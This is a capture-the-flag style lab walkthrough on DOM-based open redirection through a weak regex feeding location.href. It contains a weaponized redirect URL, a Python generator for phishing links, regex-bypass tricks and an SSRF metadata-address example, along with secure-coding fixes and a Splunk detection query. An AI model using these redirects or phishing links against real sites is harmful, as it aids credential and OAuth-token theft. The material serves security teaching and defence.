
# Lab Walkthrough: DOM-based Open Redirection

* **Vulnerability Type:** DOM-Based Open Redirection
* **Target Context:** Client-Side JavaScript (`location.href` Sink)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 10–15 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [Redirection Vulnerabilities Comparison](#4-redirection-vulnerabilities-comparison)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

DOM-based Open Redirection occurs when a web application reads a user-controlled URL from the DOM (such as `location.search` or `location.hash`) and passes it into a navigation sink (like `window.location` or `location.href`) without proper validation. 

* **The Core Flaw:** The application relies on client-side JavaScript to handle post-action routing (e.g., a "Back to Blog" button). The script extracts the destination from the URL using a weak Regular Expression (Regex) that allows arbitrary external domains.
* **Real-World Analogy:** Imagine a taxi driver (the browser) who is instructed by the dispatcher (the legitimate website) to ask the passenger (the URL parameter) for the exact address of the hotel. The driver blindly drives to wherever the passenger says, effectively allowing the passenger to hijack the route to a malicious location.
* **The Sink (`location.href`):** Assigning a string to `location.href` immediately instructs the browser to navigate to that URL.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   DOM OPEN REDIRECTION FLOW                            │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker URL] [https://target.com/post?url=https://evil-server.net](https://target.com/post?url=https://evil-server.net)
           │
           ▼
  [2. Victim Action] Clicks the "Back to Blog" link on the page.
           │
           ▼
  [3. JS Execution] Regex parses window.location to find the "?url=" value.
           │
           ▼
  [4. Flawed Validation] Regex only checks if the string starts with http:// 
      or https://. It does NOT verify the domain name.
           │
           ▼
  [5. Sink Execution] location.href = "[https://evil-server.net](https://evil-server.net)"
      -> Victim is silently redirected to the attacker's phishing page.

```

> **Learning Checkpoint 1:** Why is Open Redirection a high-value target for attackers? While it doesn't directly compromise the server, it is the linchpin for advanced attack chains. It lends the legitimate site's credibility to phishing campaigns (bypassing email spam filters) and is frequently used to steal OAuth tokens by redirecting authentication callbacks to attacker-controlled domains.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The "Back to Blog" anchor link on individual blog posts.
* **Primary Objective:** Exploit the client-side routing logic to redirect the victim's browser to the provided Exploit Server.
* **Validation Signal:** The lab is solved when the simulated victim visits your crafted URL and is successfully redirected to your Exploit Server.

---

## 3. Step-by-Step Exploitation Flow

Adopt a structured approach to mapping client-side validation logic and identifying Regex weaknesses.

* **Phase 1: Reconnaissance & Source Mapping**
* Navigate to a specific blog post (e.g., `/post?postId=4`).
* Locate the "Back to Blog" link at the bottom of the page.
* Inspect the element to view the inline JavaScript:
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

```




* **Phase 2: Code Review & Regex Analysis**
* **The Regex:** `/url=(https?:\/\/.+)/`
* **Breakdown:**
* `url=` matches the literal string.
* `(` starts the capture group (`returnUrl[1]`).
* `https?` matches `http` or `https`.
* `:\/\/` matches `://`.
* `.+` matches any character, one or more times (until the end of the string).


* **The Flaw:** The developer intended to allow dynamic routing but only verified the protocol (`http://`). They completely failed to anchor the domain (e.g., ensuring it points to `web-security-academy.net`).


* **Phase 3: Payload Construction & Execution**
* Since the Regex simply looks for `url=http(s)://[anything]`, we can supply our Exploit Server URL directly.
* **Constructed Payload:** `&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
* **Final Weaponized URL:**
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`
* Copy this full URL and paste it into the browser.
* Click the **Back to Blog** link.
* *Result:* You are instantly redirected to the Exploit Server. Submit this URL to the lab's victim simulation to solve it.



> **Learning Checkpoint 2:** If the Regex was `/url=(https?:\/\/target\.com.+)/`, how could you bypass it? You could use URL parameter tricks or domain registering tactics, such as `https://target.com.evil.com` or `https://evil.com/?q=https://target.com`. Regex validation for URLs is notoriously difficult to secure against all edge cases.

---

## 4. Redirection Vulnerabilities Comparison

Understanding how different redirection flaws operate dictates your exploitation strategy during an assessment.

| Vulnerability | Context | Impact / Goal | Example Vector |
| --- | --- | --- | --- |
| **DOM Open Redirect** | Client-Side (JS) | Phishing, OAuth Token Theft | `?next=https://evil.com` $\rightarrow$ `location.href` |
| **Server-Side Open Redirect** | Backend (HTTP 302) | Phishing, Bypassing SSRF filters | `Location: https://evil.com` HTTP header |
| **SSRF (Server-Side Request Forgery)** | Backend (Internal) | Internal network pivot, metadata theft | `?url=http://169.254.169.254` (Backend fetches data) |

---

## 5. Automated Exploitation Script (Python PoC)

This script generates the weaponized phishing link. In a real-world engagement, this link would be embedded in a spear-phishing email or delivered via a watering hole attack.

```python
#!/usr/bin/env python3
"""
DOM Open Redirection Weaponized Link Generator (PoC)
Generates URLs designed to bypass flawed protocol-only Regex validations.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url, exploit_server):
    # Ensure the target endpoint is correct
    base_endpoint = f"{target_url}/post?postId=1"
    
    # Construct the payload parameter that satisfies the regex: /url=(https?:\/\/.+)/
    payload_param = f"&url={exploit_server}"
    
    # Construct the final weaponized URL
    weaponized_link = f"{base_endpoint}{payload_param}"
    
    print("[*] Generating Weaponized Open Redirection Link...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 open_redirect_gen.py <target_base_url> <exploit_server_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    exploit = sys.argv[2]
    generate_phishing_link(target, exploit)

```

---

## 6. Defense, Hardening & Secure Coding

To eliminate DOM-based Open Redirection, developers must strictly control data passed to navigation sinks.

* **Avoid User-Controlled Routing (Primary Defense):** Do not use URL parameters, fragments, or external input to determine application routing.
* **Use Relative Paths:** If dynamic routing is necessary, force the route to be a relative path, stripping out protocols and external domains.
```javascript
// Secure: Forcing a relative path evaluation
let routeId = new URLSearchParams(window.location.search).get('returnId');
// Map an integer ID to a known, safe relative path
const safeRoutes = { "1": "/home", "2": "/dashboard" };
location.href = safeRoutes[routeId] || "/";

```


* **Strict URL Parsing (Defense in Depth):** If absolute URLs must be used, do not rely on Regex. Use the browser's native `URL` API to parse the string and strictly validate the `hostname` property against an exact match of the trusted domain.

---

## 7. SIEM Detection & Telemetry Analysis

Detecting Open Redirection requires monitoring for anomalies in URL parameters that typically handle internal routing (`next`, `url`, `return`, `redirect_uri`).

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| regex uri_query="(?i)(url|next|redirect|return)=https?:\/\/(?!(*\.trusted-domain\.com))"
| stats count by src_ip, uri_path, uri_query
| where count > 0

```

*Note: This query looks for standard redirection parameters containing `http://` or `https://` that are NOT pointing to the organization's trusted domain structure.*

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Clicking the link redirects to `/` (Home)** | Regex failed to match. | The payload didn't satisfy the Regex. Ensure you include `http://` or `https://` exactly. (e.g., `url=evil.com` will fail, `url=https://evil.com` will succeed). |
| **Browser blocks the redirect** | Browser security features (rare for simple `location.href`). | Check if the exploit server requires HTTPS but you provided an HTTP link, causing mixed-content blocks or HSTS failures. |
| **URL Parameter is stripped** | Backend WAF or routing override. | Some backend routers strip unrecognized parameters before the page loads. Try moving the payload to the URL fragment (e.g., `#url=https://...`) if the Regex uses `location` rather than strictly `location.search`. |

---

## 9. References & Standards

* [OWASP: Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html?utm_source=gemini)
* [PortSwigger: DOM-Based Open Redirection](https://portswigger.net/web-security/dom-based/open-redirection?utm_source=gemini)
* [MITRE ATT&CK Framework: Technique T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/?utm_source=gemini)

---

> **Key Insight:** Open Redirection is rarely a standalone critical vulnerability, but it acts as a powerful catalyst for secondary attacks. By leveraging the trust and SSL certificates of the vulnerable domain, attackers drastically increase the success rate of OAuth token harvesting and targeted credential phishing campaigns.
